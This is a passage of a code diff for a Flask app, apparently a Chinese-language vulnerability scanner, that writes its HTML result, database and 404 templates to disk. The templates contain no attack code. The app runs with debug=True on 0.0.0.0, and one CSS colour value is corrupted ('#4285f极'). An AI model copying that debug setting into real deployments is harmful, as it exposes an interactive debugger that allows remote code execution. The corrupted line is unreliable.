+            border-left-color: var(--success);
+        }
+
+        .vuln-card.vulnerable {
+            border-left-color: var(--accent);
+            background: rgba(233, 69, 96, 0.1);
+        }
+
+        .vuln-card h3 {
+            font-size: 1.2rem;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+
+        .status-vulnerable {
+            background: var(--accent);
+        }
+
+        .status-safe {
+            background: var(--success);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+        }
+
+        th, td {
+            padding: 15px;
+            text-align: left;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        th {
+            background: rgba(0, 0, 0, 0.3);
+            font-weight: 500;
+            color: var(--accent);
+        }
+
+        tr:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .btn {
+            display: inline-block;
+            background: var(--info);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 1rem;
+            font-weight: 500;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: var(--transition);
+            text-align: center;
+            text-decoration: none;
+            margin-top: 20px;
+        }
+
+        .btn:hover {
+            background: #2b6de9;
+            transform: translateY(-3px);
+            box-shadow: 0 7px 15px rgba(66, 133, 244, 0.3);
+        }
+
+        footer {
+            text-align: center;
+            padding: 40px 0;
+            margin-top: 60px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .alert {
+            padding: 15px;
+            border-radius: 6px;
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .alert-danger {
+            background: rgba(233, 69, 96, 0.2);
+            border: 1px solid var(--accent);
+        }
+
+        .alert-warning {
+            background: rgba(255, 154, 60, 0.2);
+            border: 1px solid var(--warning);
+        }
+
+        .alert-success {
+            background: rgba(15, 157, 88, 0.2);
+            border: 1px solid var(--success);
+        }
+
+        /* Responsive styles */
+        @media (max-width: 768px) {
+            .result-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="navbar">
+                <a href="/" class="logo">
+                    <span class="logo-icon">🔒</span>
+                    <span>VulnScanner</span>
+                </a>
+                <div class="nav-links">
+                    <a href="/" class="nav-link">首页</a>
+                    <a href="/vulnerabilities" class="nav-link">漏洞库</a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="container">
+        <div class="hero">
+            <h1>扫描结果</h1>
+            <p>目标: {{ url }} | 扫描类型: {{ scan_type }}</p>
+        </div>
+
+        <div class="card">
+            <h2 class="card-title">漏洞检测结果</h2>
+
+            <div class="result-grid">
+                {% for result in results %}
+                <div class="vuln-card {% if result.vulnerable %}vulnerable{% else %}safe{% endif %}">
+                    <h3>
+                        <span>{{ result.name }}</span>
+                        <span class="status-badge {% if result.vulnerable %}status-vulnerable{% else %}status-safe{% endif %}">
+                            {% if result.vulnerable %}存在漏洞{% else %}安全{% endif %}
+                        </span>
+                    </h3>
+                    <p><strong>状态:</strong> {{ result.message }}</p>
+                    <p><strong>耗时:</strong> {{ result.time }}</p>
+                </div>
+                {% endfor %}
+            </div>
+
+            <a href="/" class="btn">返回首页</a>
+        </div>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>漏洞扫描系统 &copy; {{ now.strftime('%Y') }} - 安全防护专家</p>
+            <p>扫描完成时间: {{ now.strftime('%Y-%m-%d %H:%M:%S') }}</p>
+        </div>
+    </footer>
+</body>
+</html>""")
+
+    # 创建 batch_results.html
+    batch_results_path = os.path.join(templates_dir, 'batch_results.html')
+    with open(batch_results_path, 'w', encoding='utf-8') as f:
+        f.write("""<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>批量扫描结果 - VulnScanner</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #1a1a2e;
+            --secondary: #16213e;
+            --accent: #e94560;
+            --warning: #ff9a3c;
+            --success: #0f9d58;
+            --info: #4285f极;
+            --text-light: #f0f0f0;
+            --text-dark: #333;
+            --card-bg: rgba(255, 255, 255, 0.08);
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            color: var(--text-light);
+            min-height: 100vh;
+            background-attachment: fixed;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        header {
+            background: rgba(10, 10, 20, 0.85);
+            backdrop-filter: blur(10px);
+            padding: 15px 0;
+            border-bottom: 1px solid rgba(233, 69, 96, 0.3);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            font-size: 1.8rem;
+            color: var(--text-light);
+            text-decoration: none;
+        }
+
+        .logo-icon {
+            color: var(--accent);
+            font-size: 2rem;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 25px;
+        }
+
+        .nav-link {
+            color: var(--text-light);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 1.1rem;
+            transition: var(--transition);
+            padding: 8px 15px;
+            border-radius: 4px;
+        }
+
+        .nav-link:hover, .nav-link.active {
+            background: rgba(233, 69, 96, 0.2);
+            color: var(--accent);
+        }
+
+        .hero {
+            padding: 50px 0 30px;
+            text-align: center;
+        }
+
+        .hero h1 {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            font-weight: 700;
+            background: linear-gradient(45deg, var(--accent), var(--warning));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        .hero p {
+            font-size: 1.1rem;
+            opacity: 0.85;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .card-title {
+            font-size: 1.6rem;
+            margin-bottom: 20px;
+            color: var(--accent);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .result-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 25px;
+            margin-top: 20px;
+        }
+
+        .vuln-card {
+            background: rgba(0, 0, 0, 0.25);
+            border-radius: 10px;
+            padding: 20px;
+            border-left: 4px solid var(--accent);
+        }
+
+        .vuln-card.safe {
+            border-left-color: var(--success);
+        }
+
+        .vuln-card.vulnerable {
+            border-left-color: var(--accent);
+            background: rgba(233, 69, 96, 0.1);
+        }
+
+        .vuln-card h3 {
+            font-size: 1.2rem;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+
+        .status-vulnerable {
+            background: var(--accent);
+        }
+
+        .status-safe {
+            background: var(--success);
+        }
+
+        .target-card {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-left: 4px solid var(--info);
+        }
+
+        .vulnerable-count {
+            font-size: 1.2rem;
+            margin: 10px 0;
+            padding: 8px 15px;
+            background: rgba(233, 69, 96, 0.2);
+            border-radius: 20px;
+            display: inline-block;
+        }
+
+        .btn {
+            display: inline-block;
+            background: var(--info);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 1rem;
+            font-weight: 500;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: var(--transition);
+            text-align: center;
+            text-decoration: none;
+            margin-top: 20px;
+        }
+
+        .btn:hover {
+            background: #2b6de9;
+            transform: translateY(-3px);
+            box-shadow: 0 7px 15px rgba(66, 133, 244, 0.3);
+        }
+
+        footer {
+            text-align: center;
+            padding: 40px 0;
+            margin-top: 60px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .alert {
+            padding: 15px;
+            border-radius: 6px;
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .alert-danger {
+            background: rgba(233, 69, 96, 0.2);
+            border: 1px solid var(--accent);
+        }
+
+        .alert-warning {
+            background: rgba(255, 154, 60, 0.2);
+            border: 1px solid var(--warning);
+        }
+
+        .alert-success {
+            background: rgba(15, 157, 88, 0.2);
+            border: 1px solid var(--success);
+        }
+
+        /* Responsive styles */
+        @media (max-width: 768px) {
+            .result-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="navbar">
+                <a href="/" class="logo">
+                    <span class="logo-icon">🔒</span>
+                    <span>VulnScanner</span>
+                </a>
+                <div class="nav-links">
+                    <a href="/" class="nav-link">首页</a>
+                    <a href="/vulnerabilities" class="nav-link">漏洞库</a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="container">
+        <div class="hero">
+            <h1>批量扫描结果</h1>
+            <p>扫描类型: {{ scan_type }} | 目标数量: {{ results|length }}</p>
+        </div>
+
+        <div class="card">
+            <h2 class="card-title">扫描结果概览</h2>
+
+            {% for result in results %}
+            <div class="target-card">
+                <h3>目标: {{ result.url }}</h3>
+
+                {% if 'error' in result %}
+                    <div class="alert alert-danger">
+                        <span>⚠️</span>
+                        <div>
+                            <strong>扫描错误:</strong> {{ result.error }}
+                        </div>
+                    </div>
+                {% else %}
+                    <p class="vulnerable-count">检测到漏洞数量: {{ result.vulnerabilities_count }}</p>
+
+                    <div class="result-grid">
+                        {% for detail in result.details %}
+                        <div class="vuln-card {% if detail.vulnerable %}vulnerable{% else %}safe{% endif %}">
+                            <h3>
+                                <span>{{ detail.name }}</span>
+                                <span class="status-badge {% if detail.vulnerable %}status-vulnerable{% else %}status-safe{% endif %}">
+                                    {% if detail.vulnerable %}存在漏洞{% else %}安全{% endif %}
+                                </span>
+                            </h3>
+                            <p>{{ detail.message }}</p>
+                            <p><strong>耗时:</strong> {{ detail.time }}</p>
+                        </div>
+                        {% endfor %}
+                    </div>
+                {% endif %}
+            </div>
+            {% endfor %}
+
+            <a href="/" class="btn">返回首页</a>
+        </div>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>漏洞扫描系统 &copy; {{ now.strftime('%Y') }} - 安全防护专家</p>
+            <p>扫描完成时间: {{ now.strftime('%Y-%m-%d %H:%M:%S') }}</p>
+        </div>
+    </footer>
+</body>
+</html>""")
+
+    # 创建 vulnerabilities.html
+    vulnerabilities_path = os.path.join(templates_dir, 'vulnerabilities.html')
+    with open(vulnerabilities_path, 'w', encoding='utf-8') as f:
+        f.write("""<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>漏洞库 - VulnScanner</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #1a1a2e;
+            --secondary: #16213e;
+            --accent: #e94560;
+            --warning: #ff9a3c;
+            --success: #0f9d58;
+            --info: #4285f4;
+            --text-light: #f0f0f0;
+            --text-dark: #333;
+            --card-bg: rgba(255, 255, 255, 0.08);
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            color: var(--text-light);
+            min-height: 100vh;
+            background-attachment: fixed;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        header {
+            background: rgba(10, 10, 20, 0.85);
+            backdrop-filter: blur(10px);
+            padding: 15px 0;
+            border-bottom: 1px solid rgba(233, 69, 96, 0.3);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            font-size: 1.8rem;
+            color: var(--text-light);
+            text-decoration: none;
+        }
+
+        .logo-icon {
+            color: var(--accent);
+            font-size: 2rem;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 25px;
+        }
+
+        .nav-link {
+            color: var(--text-light);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 1.1rem;
+            transition: var(--transition);
+            padding: 8px 15px;
+            border-radius: 4px;
+        }
+
+        .nav-link:hover, .nav-link.active {
+            background: rgba(233, 69, 96, 0.2);
+            color: var(--accent);
+        }
+
+        .hero {
+            padding: 50px 0 30px;
+            text-align: center;
+        }
+
+        .hero h1 {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            font-weight: 700;
+            background: linear-gradient(45deg, var(--accent), var(--warning));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        .hero p {
+            font-size: 1.1rem;
+            opacity: 0.85;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .card-title {
+            font-size: 1.6rem;
+            margin-bottom: 20px;
+            color: var(--accent);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 14px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 6px;
+            color: var(--text-light);
+            font-size: 1rem;
+            transition: var(--transition);
+        }
+
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: var(--accent);
+            background: rgba(0, 0, 0, 0.4);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+        }
+
+        th, td {
+            padding: 15px;
+            text-align: left;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        th {
+            background: rgba(0, 0, 0, 0.3);
+            font-weight: 500;
+            color: var(--accent);
+        }
+
+        tr:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .btn {
+            display: inline-block;
+            background: var(--info);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 1rem;
+            font-weight: 500;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: var(--transition);
+            text-align: center;
+            text-decoration: none;
+            margin-top: 20px;
+        }
+
+        .btn:hover {
+            background: #2b6de9;
+            transform: translateY(-3px);
+            box-shadow: 0 7px 15px rgba(66, 133, 244, 0.3);
+        }
+
+        footer {
+            text-align: center;
+            padding: 40px 0;
+            margin-top: 60px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .severity-badge {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 4px;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+
+        .severity-high {
+            background: var(--accent);
+        }
+
+        .severity-critical {
+            background: #d32f2f;
+        }
+
+        .severity-medium {
+            background: var(--warning);
+        }
+
+        /* Responsive styles */
+        @media (max-width: 768px) {
+            table {
+                display: block;
+                overflow-x: auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="navbar">
+                <a href="/" class="logo">
+                    <span class="logo-icon">🔒</span>
+                    <span>VulnScanner</span>
+                </a>
+                <div class="nav-links">
+                    <a href="/" class="nav-link">首页</a>
+                    <a href="/vulnerabilities" class="nav-link active">漏洞库</a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="container">
+        <div class="hero">
+            <h1>漏洞数据库</h1>
+            <p>包含常见漏洞的详细信息、影响版本和解决方案</p>
+        </div>
+
+        <div class="card">
+            <div class="form-group">
+                <input type="text" placeholder="搜索漏洞名称、CVE ID或关键词...">
+            </div>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>CVE ID</th>
+                        <th>漏洞名称</th>
+                        <th>严重程度</th>
+                        <th>影响版本</th>
+                        <th>解决方案</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for vuln in vuln_db %}
+                    <tr>
+                        <td>{{ vuln.id }}</td>
+                        <td>{{ vuln.name }}</td>
+                        <td>
+                            {% if vuln.severity == '严重' %}
+                                <span class="severity-badge severity-critical">{{ vuln.severity }}</span>
+                            {% elif vuln.severity == '高危' %}
+                                <span class="severity-badge severity-high">{{ vuln.severity }}</span>
+                            {% else %}
+                                <span class="severity-badge severity-medium">{{ vuln.severity }}</span>
+                            {% endif %}
+                        </td>
+                        <td>{{ vuln.affected_versions }}</td>
+                        <td>{{ vuln.solution }}</td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+
+            <a href="/" class="btn">返回首页</a>
+        </div>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>漏洞扫描系统 &copy; {{ now.strftime('%Y') }} - 安全防护专家</p>
+            <p>数据库更新时间: {{ now.strftime('%Y-%m-%d %H:%M:%S') }}</p>
+        </div>
+    </footer>
+</body>
+</html>""")
+
+    # 创建 404.html
+    not_found_path = os.path.join(templates_dir, '404.html')
+    with open(not_found_path, 'w', encoding='utf-8') as f:
+        f.write("""<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>页面未找到 - VulnScanner</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #1a1a2e;
+            --secondary: #16213e;
+            --accent: #e94560;
+            --warning: #ff9a3c;
+            --success: #0f9d58;
+            --info: #4285f4;
+            --text-light: #f0f0f0;
+            --text-dark: #333;
+            --card-bg: rgba(255, 255, 255, 0.08);
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            color: var(--text-light);
+            min-height: 100vh;
+            background-attachment: fixed;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        header {
+            background: rgba(10, 10, 20, 0.85);
+            backdrop-filter: blur(10px);
+            padding: 15px 0;
+            border-bottom: 1px solid rgba(233, 69, 96, 0.3);
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            font-size: 1.8rem;
+            color: var(--text-light);
+            text-decoration: none;
+        }
+
+        .logo-icon {
+            color: var(--accent);
+            font-size: 2rem;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 25px;
+        }
+
+        .nav-link {
+            color: var(--text-light);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 1.1rem;
+            transition: var(--transition);
+            padding: 8px 15px;
+            border-radius: 4px;
+        }
+
+        .nav-link:hover, .nav-link.active {
+            background: rgba(233, 69, 96, 0.2);
+            color: var(--accent);
+        }
+
+        .error-container {
+            text-align: center;
+            padding: 100px 0;
+        }
+
+        .error-code {
+            font-size: 8rem;
+            font-weight: 700;
+            background: linear-gradient(45deg, var(--accent), var(--warning));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-family: 'Orbitron', sans-serif;
+            margin-bottom: 20px;
+        }
+
+        .error-message {
+            font-size: 2rem;
+            margin-bottom: 30px;
+        }
+
+        .btn {
+            display: inline-block;
+            background: var(--info);
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            font-size: 1.1rem;
+            font-weight: 500;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: var(--transition);
+            text-align: center;
+            text-decoration: none;
+        }
+
+        .btn:hover {
+            background: #2b6de9;
+            transform: translateY(-3px);
+            box-shadow: 0 7px 15px rgba(66, 133, 244, 0.3);
+        }
+
+        footer {
+            text-align: center;
+            padding: 40px 0;
+            margin-top: 60px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.6);
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="navbar">
+                <a href="/" class="logo">
+                    <span class="logo-icon">🔒</span>
+                    <span>VulnScanner</span>
+                </a>
+                <div class="nav-links">
+                    <a href="/" class="nav-link">首页</a>
+                    <a href="/vulnerabilities" class="nav-link">漏洞库</a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="container">
+        <div class="error-container">
+            <div class="error-code">404</div>
+            <div class="error-message">页面未找到</div>
+            <p>请求的页面不存在，请检查URL是否正确</p>
+            <a href="/" class="btn">返回首页</a>
+        </div>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>漏洞扫描系统 &copy; {{ now.strftime('%Y') }} - 安全防护专家</p>
+        </div>
+    </footer>
+</body>
+</html>""")
+
+
+# 运行应用
+if __name__ == '__main__':
+    # 确保模板目录和文件存在
+    ensure_template_directory()
+
+    # 运行应用
+    app.run(host='0.0.0.0', port=5000, debug=True)
